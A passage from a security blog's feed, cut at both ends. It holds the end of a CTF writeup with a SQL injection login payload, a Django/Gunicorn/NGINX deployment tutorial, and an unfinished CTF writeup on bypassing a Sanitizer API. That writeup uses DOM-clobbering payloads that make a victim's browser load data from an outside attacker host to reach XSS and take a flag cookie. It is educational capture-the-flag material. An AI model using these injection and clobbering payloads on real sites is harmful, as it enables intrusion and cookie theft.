class=\"shiki material-default\" sql=\"true\"><div class=\"language-id\">sql</div><div class='code-container'><code><div class='line'>username=admin' UNION SELECT NULL, NULL --&password=password&otp=OTPHERE</div></code></div></pre><!-- HTML_TAG_END --><p>With OTP from the one i found in the cookies. Upon send the post request, i got the <strong>FLAG!</strong></p>","summary":"Writeups for 2 of web challenges from Blackhat MEA Qualifier CTF Round namely Authy and Warm Me Up","date_published":"2023-11-13T00:00:00.000Z","date_modified":"2024-09-14T21:03:45.278Z","tags":["blackhatmea","ctf","authy","warmme-up","unicode","broken-logic"],"_indieweb":{"type":"article"}},{"id":"blog/2023/deploy-django-website-nginx-gunicorn-ubuntu-22","url":"https://blog.shameerkashif.me/blog/2023/deploy-django-website-nginx-gunicorn-ubuntu-22","title":"Deploy a Django Application on Ubuntu 22.04 with Gunicorn & NGINX","content_html":"<h2 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h2><p>Hi, its been a while since i wrote something on my blog. Today, i am going to write about the process of deployment of a django application on a Ubuntu 22.02 live server. I‚Äôll try to cover as much details as i can and mention about the common issues i normally faces while following the process. This article is also a kind of reminder for myself for the tutorials and blog that i followed and the issues i ran into. So, we are going to cover this deployment process through <strong>Gunicorn</strong>, <strong>NGINX</strong> and optionally using <strong>Postgresql</strong> database. </p><h2 id=\"tutorial\"><a href=\"#tutorial\">Tutorial</a></h2><p>So, without wasting any further time. Lets jump right into the details. </p><h3 id=\"pre-reqs\"><a href=\"#pre-reqs\">Pre-Reqs</a></h3><p>The foremost thing are the pre-reqs that we need to follow this tutorial. First is a server with a public IP. Many of you who are reading this might already have one before moving one. Well, if you don‚Äôt you can simply get one from any of the hosting services or Cloud platforms. Personally, i use <strong>DigitalOcean</strong> or <strong>AWS</strong> most of the time. And also, for the sake of this tutorial i‚Äôll be using a <code>t2.micro</code> instance of EC2 service from AWS. </p><p>But in general what you need is an online server with <strong>Ubuntu 22.04</strong> installed and with publicly accessibly ports. Thi should also work just fine with Ubuntu 20.04. Let me know in comments if someone tests it. </p><h3 id=\"installing-packages\"><a href=\"#installing-packages\">Installing Packages</a></h3><p>First, lets update our <strong>ubuntu</strong> machine and install the required packages: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>sudo apt update</div><div class='line'>sudo apt install -y nginx python3 python3-dev python3-pip python3-virtualenv libpq-dev postgresql postgresql-contrib</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/5796e18f-36ee-4cb5-bd9c-7a8398627981\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Before going forward, lets escalate to the <code>root</code> shell as we might run into the permission issues again and again. And don‚Äôt worry, we will see the project and permissions of the other files at the last: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>sudo -s</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/be2a19b9-c46a-4a72-b70f-dbb0446dd33c\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"setting-up-project-directory\"><a href=\"#setting-up-project-directory\">Setting up Project Directory</a></h3><p>Now, lets move to the <code>/var/www/</code> directory where we are going to place our project folder. I am going to setup a project from scratch for demo purposes using <code>django-admin</code> command. But if you already have one, make sure its uploaded correctly. I normally used <code>rsync</code> for this: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>rsync -arvz -e 'ssh -p &lt;port-number&gt;' --progress --delete /path/to/local/folder user@remote-server:/var/www/</div></code></div></pre><!-- HTML_TAG_END --><p>For now, i will setup a new project from scratch and name it <code>myweb</code>. Lets install django and initialize an empty project: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>cd /var/www</div><div class='line'>pip3 install django</div><div class='line'>django-admin startproject myweb</div></code></div></pre><!-- HTML_TAG_END --><p>Move to <code>myweb</code> and initialize new <em>virtual environment</em>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>cd myweb/</div><div class='line'>virtualenv venv</div></code></div></pre><!-- HTML_TAG_END --><p>Moving forward, activate the virtual environment and install all the necessary packages that you might have placed in <code>requirements.txt</code>. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>source ./venv/bin/activate</div><div class='line'>pip3 install -r requirements.txt     # In case you have one</div><div class='line'>pip3 install django gunicorn psycopg2-binary</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"setting-up-postgres-database\"><a href=\"#setting-up-postgres-database\">Setting up Postgres (Database)</a></h3><p>You could move forward without this step if you are planning on using some other database or the default sqlite. But please note that you will have to install the relevant packages for that. While in this case, i am only focusing on <code>postgres</code>. </p><p>Launch <code>postgres</code>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>sudo -u postgres psql</div></code></div></pre><!-- HTML_TAG_END --><p>The next steps are supposed to be inside the <code>postgres</code> terminal. Create a new database. I am naming it <code>hashbase</code>. Setup a new user and assign it to the database that we just created: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>CREATE DATABASE hashbase;</div><div class='line'>CREATE USER hashbaseuser WITH PASSWORD 'password1122';</div><div class='line'>GRANT ALL PRIVILEGES ON DATABASE hashbase TO hashbaseuser;</div></code></div></pre><!-- HTML_TAG_END --><p>Next, we will modify a couple of our database settings for better processing and django functions: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>ALTER ROLE hashbaseuser SET client_encoding TO 'utf8';</div><div class='line'>ALTER ROLE hashbaseuser SET default_transaction_isolation TO 'read committed';</div><div class='line'>ALTER ROLE hashbaseuser SET timezone TO 'UTC';</div></code></div></pre><!-- HTML_TAG_END --><p>Quit:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>q</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/a450e21a-dfbe-4122-986f-8b5dc9e5c284\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"project-settings\"><a href=\"#project-settings\">Project Settings</a></h3><p>We will look at the project settings now that needs to be replaced or modified. Considering we are in the project directory located at <code>/var/www/myweb</code>. Lets edit the <code>settings.py</code> file: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>nano myweb/settings.py</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/3f6ad510-3443-4499-90ba-2ef8098d0989\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Edit the <code>ALLOWED_HOSTS</code> list variable to include all the <strong>IPs</strong> or <strong>Hostnames</strong> that you plan on using for the website. In here, i am simply going to put the <strong>PUBLIC IP</strong> of the server i am on. You can put domain names if you are going to configure one with the website. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>...</div><div class='line'></div><div class='line'>ALLOWED_HOSTS = [</div><div class='line'>  '13.229.230.156',      # Public IP of the Server</div><div class='line'>  'mydomain.com',        # In case you have a domain, you can skip the IP Address</div><div class='line'>  'someotherhostetc',</div><div class='line'>]</div><div class='line'></div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>Now, move a bit below to this and find the <code>DATABASES</code> variable section. By default it is configured to use <code>sqlite3</code> as its database. We will change the settings to use <code>postgresql</code>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>...</div><div class='line'></div><div class='line'>DATABASES = &#123;</div><div class='line'>    'default': &#123;</div><div class='line'>        'ENGINE': 'django.db.backends.postgresql_psycopg2',</div><div class='line'>        'NAME': 'hashbase',</div><div class='line'>        'USER': 'hashbaseuser',</div><div class='line'>        'PASSWORD': 'password1122',</div><div class='line'>        'HOST': 'localhost',</div><div class='line'>        'PORT': '',</div><div class='line'>    &#125;</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>After this, we need to setup a <code>static</code> and <code>media</code> directory where our project static files are going to be stored. The <code>media</code> folder will contain files that are supposed to be uploaded by the user of the application. So, again in the <code>settings.py</code> file, move at the end of the file and find the line <code>STATIC_URL = &#39;static/&#39;</code> and add some new content below it: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>...</div><div class='line'></div><div class='line'>STATIC_URL = 'static/'</div><div class='line'>STATIC_ROOT = BASE_DIR / 'public'</div><div class='line'>MEDIA_URL  = 'media/'</div><div class='line'>MEDIA_ROOT = BASE_DIR / 'media'</div><div class='line'></div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>The <code>STATIC_ROOT</code> defines the folder where the public content like <em>css,js or imgs</em> are going to be stored upon running the <code>collectstatic</code> command on <code>manage.py</code> file. Please note that its totally different from the <code>STATICFILES_DIRS</code> variable which is used to define the directories to locate static files. Think of <code>STATIC_ROOT</code> as more of a <strong>production</strong> specific variable. </p><h3 id=\"spin-up-the-project\"><a href=\"#spin-up-the-project\">Spin up the Project</a></h3><p>Lets move towards spinning up the project for the public. For that, we will do the normal django commands like migrations and super user. </p><p>Run migrations and create a superuser: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>python3 manage.py makemigrations</div><div class='line'>python3 manage.py migrate</div><div class='line'>python3 manage.py createsuperuser     # Enter your credentials for the superuser when prompted</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/bf41701c-c35d-448e-adbc-ff111a9ef7e6\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>After this, we will run the <code>collectstatic</code> command to locate all the static files we have in our project and put them to the folder that we defined at <code>STATIC_ROOT</code> variable. These static files will be served by the <code>nginx</code> server and not from django like we see during the development.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>python3 manage.py collectstatic</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/a79e25e0-5960-4cd5-ab97-f359cc2de470\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>You can now execute the <code>runserver</code> command on public interface to see your website. Before also make sure nginx is not using the port <code>80</code> by default: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>service nginx stop</div><div class='line'>python3 manage.py runserver 0.0.0.0:80</div></code></div></pre><!-- HTML_TAG_END --><p>Now, if you access your website at port <code>80</code> you would be able to see your project:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>http://PUBLCI_IP_ADDRESS</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/f1bea206-f36f-4df3-8448-f5b2824587c1\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Finally, back in the <code>settings.py</code> put the <code>DEBUG</code> value to <code>False</code>. You can keep it enabled if you are going to debug the project or facing some other issue. But make sure to put the value to <code>False</code> for the production cases:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>nano myweb/settings.py</div><div class='line'></div><div class='line'>...</div><div class='line'>DEBUG = False</div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>At this point, we have our project all ok. But this is not how we are going to host the website actually. </p><h3 id=\"setting-up-gunicorn\"><a href=\"#setting-up-gunicorn\">Setting up Gunicorn</a></h3><p>Gunicorn is the server service that we are going to configure with <code>nginx</code> for the public. We will configure a new <code>systemd</code> service for this. But before, we will test if <code>gunicorn</code> is really working or not. So, simply bind gunicorn to the <code>0.0.0.0</code> and test if we can access the website at port <code>80</code> like we did before. Note that we are still inside <code>/var/www/myweb</code> directory</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>gunicorn --bind 0.0.0.0:80 myweb.wsgi</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/8c4e703d-fcf7-4658-b358-1addaa74f6fb\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Fire up <code>nano</code> again for the gunicorn service and do the configuration: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>nano /etc/systemd/system/gunicorn.service</div></code></div></pre><!-- HTML_TAG_END --><p>Inside the file. I‚Äôll not get into much details of what is happening here. But you can refer to the <code>systemd</code> documentation for more in depth detail. However, we will review the <code>Service</code> section here:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>[Unit]</div><div class='line'>Description=gunicorn daemon</div><div class='line'>After=network.target</div><div class='line'></div><div class='line'>[Service]</div><div class='line'>User=www-data</div><div class='line'>Group=www-data</div><div class='line'>WorkingDirectory=/var/www/myweb</div><div class='line'>ExecStart=/var/www/myweb/venv/bin/gunicorn --access-logfile - --workers 3 --timeout 300 --bind unix:/var/www/myweb/myweb.sock myweb.wsgi:application</div><div class='line'></div><div class='line'>[Install]</div><div class='line'>WantedBy=multi-user.target</div></code></div></pre><!-- HTML_TAG_END --><p>The <code>User</code> and <code>Group</code> defines the privileges the command is going to be executed with. The complete command is specified with <code>ExecStart</code> variable. Make sure to specify <code>WorkingDirectory</code> as well. Otherwise, gunicorn wouldn‚Äôt be able to locate the <code>myweb.wsgi</code> on path. Save the file.</p><p>Make sure to change the project‚Äôs owner before starting gunicorn: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>chown www-data:www-data -R /var/www/myweb</div></code></div></pre><!-- HTML_TAG_END --><p>Start the service after saving and make that its running and doesn‚Äôt have any errors. If there are errors, you will need to fix them before moving forward: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>systemctl daemon-reload</div><div class='line'>systemctl restart gunicorn.service</div><div class='line'>systemctl status gunicorn.service</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/4f2ca54a-e633-4593-86f1-a292d4e899e6\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>You can see more detailed logs of gunicorn if there are errors using: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>sudo journalctl -u gunicorn</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"setting-up-nginx\"><a href=\"#setting-up-nginx\">Setting UP NGINX</a></h3><p>This is the last step. We will configure <code>nginx</code> which in short is the public server and will take requests from the public and forward it to gunicorn as a reverse proxy. Remove the default enabled nginx website and create a new <code>nginx</code> project file:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>rm /etc/nginx/sites-enabled/default</div><div class='line'>nano /etc/nginx/sites-available/myweb</div></code></div></pre><!-- HTML_TAG_END --><p>Inside the file, configure your web server: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" nginx=\"true\"><div class=\"language-id\">nginx</div><div class='code-container'><code><div class='line'>server &#123;</div><div class='line'>    listen 80;</div><div class='line'>    server_name DOMAIN_OR_PUBLIC_IP;</div><div class='line'></div><div class='line'>    location = /favicon.ico &#123; access_log off; log_not_found off; &#125;</div><div class='line'>    location /static/ &#123;</div><div class='line'>        alias /var/www/myweb/public/;</div><div class='line'>        add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;</div><div class='line'>    &#125;</div><div class='line'></div><div class='line'>    location /media/ &#123;</div><div class='line'>        alias /var/www/myweb/media/;</div><div class='line'>    &#125;</div><div class='line'></div><div class='line'>    location / &#123;</div><div class='line'>        include proxy_params;</div><div class='line'>        add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;</div><div class='line'>        proxy_pass http://unix:/var/www/myweb/myweb.sock;</div><div class='line'>    &#125;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>In the above configuration, make sure you have changed it according to your requirements. One thing to look out for is the <code>server_name</code> directive. If you are working with a domain name, make sure to replace it correctly. Another thing would be the paths that are mentioned in the configuration. Make sure all of the mentioned paths in your correct according to your settings. </p><p>Save the file and enable this nginx project by creating its soft link at <code>sites-enabled</code> directory: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>ln -s /etc/nginx/sites-available/myweb /etc/nginx/sites-enabled/myweb</div></code></div></pre><!-- HTML_TAG_END --><p>Check nginx configuration and restart nginx: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>nginx -t</div><div class='line'>systemctl restart nginx</div><div class='line'>systemctl status nginx</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/bbab172e-0279-4ac6-a274-1fa9181530da\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>If everything goes correctly, you should be able to see the nginx service running and if you visit the <strong>PUBLIC IP</strong> or <strong>Domain Name</strong> now, you will see your website. For the final test, visit the <code>/admin</code> page to make sure the static files are also served correctly from our nginx service: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>http://PUBLIC_IP_ADDRESS_OR_DOMAIN/admin</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/f3b0c7d0-3dff-40fd-b17f-4a22f280cc09\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>In case your static are not served properly, you can check the <code>nginx</code> error logs at: <code>/var/log/nginx/error.log</code> and debug the issues. </p><h2 id=\"conclusion\"><a href=\"#conclusion\">Conclusion</a></h2><p>Thanks for making it through. All in all, we saw how to host a django website using gunicorn, nginx and postgresql. Its not very tricky but yes sometimes debugging the configuration files can take time. So, while doing your own, make sure to double check your configuration files and make sure that they are making sense for what they are supposed to do. </p>","summary":"A Detailed walkthrough of the process of deploying a django application on a ubuntu server from scratch. This guide covers the deployment stages with Gunicorn, NGINX and Postgresql.","image":"https://github.com/hash3liZer/khatta/assets/29171692/ed7dd92d-f7d1-4646-9194-e02102945392","date_published":"2023-09-11T00:00:00.000Z","date_modified":"2024-09-14T21:03:45.278Z","tags":["django","deployment","development","drf","python","ubuntu"],"_indieweb":{"type":"article"}},{"id":"blog/2023/amateursctf-web-2023-writeup-sanity","url":"https://blog.shameerkashif.me/blog/2023/amateursctf-web-2023-writeup-sanity","title":"Web Sanity Writeup AmateursCTF 2023 DOM Clobbering and Prototype Pollution","content_html":"<h2 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h2><p>In the AmateursCTF 2023, there was a challenge by the name <code>Sanity</code>. Now, i wasn‚Äôt able to solve the challenge within the due time as i got stuck on the very last step of my Proof of Concept. Neverthless, i feel like writing the writeup for this one. This challenge got me hooked up for quite some time.  </p><h2 id=\"surface\"><a href=\"#surface\">Surface</a></h2><p>We were given 2 files: <code>index.js</code> and <code>sanes.ejs</code>. The former is ofcourse the execution file which we are going launch and the other file is being parsed on the way to show the input we are going to enter. The <code>index.js</code> file was calling puppeteer which is a headless browser like selenium. The browser was visiting the server created by the script, attaching the cookie which contained the <code>flag</code> and the visiting the sanes page created when we submitted the data. In index.js where the flag was being attached: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>...</div><div class='line'></div><div class='line'>app.get(\"/report/:sane\", async (req, res) =&gt; &#123;</div><div class='line'>  let ctx;</div><div class='line'>  try &#123;</div><div class='line'>    ctx = await (await browser).createIncognitoBrowserContext();</div><div class='line'>    const visit = async (browser, sane) =&gt; &#123;</div><div class='line'>      const page = await browser.newPage();</div><div class='line'>      await page.goto(\"http://localhost:3000\");</div><div class='line'>      await page.setCookie(&#123; name: \"flag\", value: process.env.FLAG &#125;);</div><div class='line'>      await page.goto(&#96;http://localhost:3000/$&#123;sane&#125;&#96;);</div><div class='line'>      await page.waitForNetworkIdle(&#123; timeout: 5000 &#125;);</div><div class='line'>      await page.close();</div><div class='line'>    &#125;;</div><div class='line'></div><div class='line'>...</div><div class='line'></div><div class='line'>// sanes.ejs file being parsed from the output</div><div class='line'>app.get(\"/:sane\", (req, res) =&gt; &#123;</div><div class='line'>  const sane = sanes.get(req.params.sane);</div><div class='line'>  if (!sane) return res.status(404).send(\"not found\");</div><div class='line'></div><div class='line'>  res.render(\"sanes\", &#123;</div><div class='line'>    id: req.params.sane,</div><div class='line'>    title: encodeURIComponent(sane.title),</div><div class='line'>    body: encodeURIComponent(sane.body),</div><div class='line'>  &#125;);</div><div class='line'>&#125;);</div></code></div></pre><!-- HTML_TAG_END --><p>Moving towards the template file, the template was using sanitizer API. Lets review the template file first: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;body&gt;</div><div class='line'>    &lt;h1 id=\"title\"&gt;</div><div class='line'>        &lt;script&gt;</div><div class='line'>            const sanitizer = new Sanitizer();   &lt;!-- This is whee the sanitizer API is being installed --&gt;</div><div class='line'>            document.getElementById(\"title\").setHTML(decodeURIComponent(&#96;&lt;%- title %&gt;&#96;), &#123; sanitizer &#125;);</div><div class='line'>        &lt;/script&gt;</div><div class='line'>    &lt;/h1&gt;</div><div class='line'>    &lt;div id=\"paste\"&gt;</div><div class='line'>        &lt;script&gt;</div><div class='line'>            class Debug &#123;</div><div class='line'>                #sanitize;</div><div class='line'>                constructor(sanitize = true) &#123;</div><div class='line'>                    this.#sanitize = sanitize</div><div class='line'>                &#125;</div><div class='line'></div><div class='line'>                get sanitize() &#123;</div><div class='line'>                    return this.#sanitize;</div><div class='line'>                &#125;</div><div class='line'>            &#125;</div><div class='line'></div><div class='line'>            async function loadBody() &#123;</div><div class='line'>                &lt;! -- VULNERABLE CODE --&gt;</div><div class='line'>                let extension = null;</div><div class='line'>                if (window.debug?.extension) &#123;</div><div class='line'>                    let res = await fetch(window.debug?.extension.toString());</div><div class='line'>                    extension = await res.json();</div><div class='line'>                &#125;</div><div class='line'></div><div class='line'>                const debug = Object.assign(new Debug(true), extension ?? &#123; report: true &#125;);</div><div class='line'>                &lt;!-- VULNERABLE CODE --&gt;</div><div class='line'>                let body = decodeURIComponent(&#96;&lt;%- body %&gt;&#96;);</div><div class='line'>                if (debug.report) &#123;</div><div class='line'>                    const reportLink = document.createElement(\"a\");</div><div class='line'>                    reportLink.innerHTML = &#96;Report &lt;%= id %&gt;&#96;;</div><div class='line'>                    reportLink.href = &#96;report/&lt;%= id %&gt;&#96;;</div><div class='line'>                    reportLink.style.marginTop = \"1rem\";</div><div class='line'>                    reportLink.style.display = \"block\"</div><div class='line'></div><div class='line'>                    document.body.appendChild(reportLink)</div><div class='line'>                &#125;</div><div class='line'></div><div class='line'>                &lt;!-- EXECUTION POINT --&gt;</div><div class='line'>                if (debug.sanitize) &#123;</div><div class='line'>                    document.getElementById(\"paste\").setHTML(body, &#123; sanitizer &#125;)</div><div class='line'>                &#125; else &#123;</div><div class='line'>                    document.getElementById(\"paste\").innerHTML = body</div><div class='line'>                &#125;</div><div class='line'>            &#125;</div><div class='line'></div><div class='line'>            loadBody();</div><div class='line'>        &lt;/script&gt;</div><div class='line'>    &lt;/div&gt;</div><div class='line'></div><div class='line'>&lt;/body&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>As we can see in the above code, we have an interesting line where the javascript was checking for <code>debug.sanitize</code> property and if its false, the data was passed without any sanitization. Moreover, if we move a little above from this statement, we find our actual target. The following code: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>let extension = null;</div><div class='line'>if (window.debug?.extension) &#123;</div><div class='line'>    let res = await fetch(window.debug?.extension.toString());</div><div class='line'>    extension = await res.json();</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>const debug = Object.assign(new Debug(true), extension ?? &#123; report: true &#125;);</div></code></div></pre><!-- HTML_TAG_END --><p>What exactly is happening here inside the if condition, the control is checking if the <code>debug.extension</code> parameter on windows object exists or not. If it does, fetch the value from URL and pass it to our next statement where we are passing the properties of 2 different javascript objects to another. There are 2 possible vulnerabilities that can be exploited here to gain XSS by bypassing the sanitizer API: </p><ul><li>DOM Clobbering</li><li>Prototype Pollution</li></ul><h2 id=\"behind-the-scenes\"><a href=\"#behind-the-scenes\">Behind the Scenes</a></h2><p>First things first, i normally work with Firefox but Sanitizer API gave me <code>undefined</code> error. So, i moved to chrome considering that <code>puppeteer</code> also uses chromium. </p><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/fbd6557c-4b5a-4955-8d12-f6e261f983e0\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Before moving forward, i‚Äôd another problem in mind about the <code>Debug</code> class. Inside the class we have: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>class Debug &#123;</div><div class='line'>    #sanitize;</div><div class='line'>    constructor(sanitize = true) &#123;</div><div class='line'>        this.#sanitize = sanitize</div><div class='line'>    &#125;</div><div class='line'></div><div class='line'>    get sanitize() &#123;</div><div class='line'>        return this.#sanitize;</div><div class='line'>    &#125;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>The class parameter initialized is a private member. The problem here is i can‚Äôt override the prameter value even with prototype pollution because its a private member. Neverthless, whats important is that default value is nothing and hence if during the exploitation, i would skip this parameter, then the <code>debug.sanitize</code> should resolve to <code>undefined</code> in the execution code condition. Well, now its a theory, so moving forward. </p><h3 id=\"dom-clobbering\"><a href=\"#dom-clobbering\">DOM Clobbering</a></h3><p>The milestone is to initialize a <code>debug</code> parameter on browser windows object. </p><p>With DOM Clobbering, if we give <code>id</code> to an element, the element is then initialized on browser‚Äôs <code>window</code> object. I started with a simple <code>div</code> tag in the <code>Name Your Rant</code> field: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;div id=\"debug\"&gt;&lt;/div&gt;</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/6362e084-0a44-493c-9c0a-a6f9878f3283\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Good enough, we got the html element. But now how to get the <code>extension</code> property on this element. I almost spend hours searching for this. Anyways, the following payload seems to give the html element as the string:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;div id=\"debug\"&gt;&lt;/div&gt;&lt;div id=\"debug\" name=\"extension\" href=\"http://payload.shameerkashif.me\"&gt;&lt;/div&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>If we are to use the <code>anchor</code> tag instead of <code>div</code> tag, we will get the URL in return. So, our first part would look like: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>&lt;a id=\"debug\"&gt;&lt;/a&gt;&lt;a id=\"debug\" name=\"extension\" href=\"http://payload.shameerkashif.me\"&gt;&lt;/a&gt;</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/d1df6d24-3879-437a-b167-00d66f6c7345\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"attacker-server\"><a href=\"#attacker-server\">Attacker Server</a></h3><p>Here‚Äôs the code that i generated using <code>bard</code>:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>import http.server</div><div class='line'>import json</div><div class='line'></div><div class='line'>def handle_request(request):</div><div class='line'>    response = &#123;\"message\": \"Hello, world!\"&#125;</div><div class='line'>    response_headers = &#123;\"Access-Control-Allow-Origin\": \"*\"&#125;</div><div class='line'>    return http.server.SimpleHTTPRequestHandler._set_headers(</div><div class='line'>        request, response, response_headers</div><div class='line'>    )</div><div class='line'></div><div class='line'>server = 